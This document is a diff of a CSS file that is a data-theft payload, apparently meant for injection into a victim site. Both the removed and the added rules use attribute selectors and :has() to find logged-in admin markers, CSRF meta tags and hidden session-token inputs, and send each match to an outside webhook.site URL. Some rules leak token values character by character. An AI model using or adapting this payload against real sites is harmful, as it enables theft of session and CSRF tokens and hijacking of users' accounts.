@@ -1,23 +1,24 @@
-/* Detect admin cookies in meta tags */
-meta[name="cookie"],
-meta[name="session"],
-meta[name="admin-token"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_cookie=1");
+/* Detect if admin is logged in by checking for user-specific element or class */
+body:has(.user-logged-in) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?logged_in=true");
 }
 
-/* Detect cookies in hidden inputs */
-input[type="hidden"][name*="cookie"],
-input[type="hidden"][name*="session"],
-input[type="hidden"][name*="token"] {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?hidden_cookie=1");
+/* Detect presence of logout button or specific logged-in nav */
+body:has(button#logout) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?logout_button=true");
 }
 
-/* Steal cookies via character-by-character exfiltration */
-/* Example for first character of a potential cookie value */
-input[type="hidden"][name*="token"][value^="a"] { 
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?token_char1=a"); 
+/* Detect meta csrf token presence */
+html:has(meta[name="csrf-token"]) {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?csrf_token");
 }
-input[type="hidden"][name*="token"][value^="b"] { 
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?token_char1=b"); 
+
+/* Detect hidden input with session token */
+form input[type="hidden"][name="session_token"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?session_token");
 }
-/* Continue for all alphanumeric chars */
+
+/* Partial match on token prefix - example for 'a' */
+form input[type="hidden"][name="session_token"][value^="a"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?session_token_starts_a");
+}
